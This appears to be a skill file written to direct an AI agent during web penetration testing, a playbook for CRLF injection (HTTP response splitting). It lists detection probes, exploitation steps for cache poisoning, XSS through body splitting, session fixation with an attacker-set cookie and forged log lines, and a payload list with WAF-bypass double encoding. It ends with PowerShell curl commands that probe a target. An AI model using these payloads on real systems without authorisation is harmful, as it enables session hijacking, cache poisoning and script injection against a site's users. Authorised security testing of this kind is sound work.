---
name: crlf
description: CRLF injection (HTTP response splitting) — inject %0d%0a to add arbitrary headers/body to responses; leading to cache poisoning, XSS via Set-Cookie, or session fixation. Use when user input lands in redirect `Location`, response headers, or log/report pages.
category: injection
---

# CRLF Injection

## Detection
- Input reflected into: redirect `Location` (`?next=`, `?url=`, `?redirect=`), `Set-Cookie`, CSV/HTTP log exports, response headers.
- Probe `%0d%0a` (CRLF), `%0d`, `%0a`, double-encoded `%250d%250a`.

## Exploitation
1. **Header injection → cache poisoning**: `?next=%0d%0aX-Injected:%20true` → check header present.
2. **XSS via Set-Cookie / body split**: inject `%0d%0a%0d%0a<script>alert(1)</script>` to terminate headers and start body (if body injection reachable).
3. **Session fixation**: `%0d%0aSet-Cookie:%20session=attacker` reflected into response.
4. **Log injection**: CRLF in fields written to access logs → forged log lines.

## Payloads
```
%0d%0a
%0d%0a%0d%0a
%0d%0aX-Injected:%20true
%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
%250d%250aX-Injected:%2520true
```

## Tool Commands (Windows)
```powershell
# detect reflected header
curl.exe -s -i "$U/redirect?url=%0d%0aX-Injected:%20true" | Select-String -Pattern 'X-Injected' -CaseSensitive:$false
# double-encoded variant for WAF
curl.exe -s -i "$U/redirect?url=%250d%250aX-Injected:%2520true" | Select-String -Pattern 'X-Injected' -CaseSensitive:$false
```

## Verification & Evidence
- Response header/body successfully injected (not stripped/encoded).
- If only `\r\n` stripped, note the sanitization and try double-encode/UTF-8 overlong variants.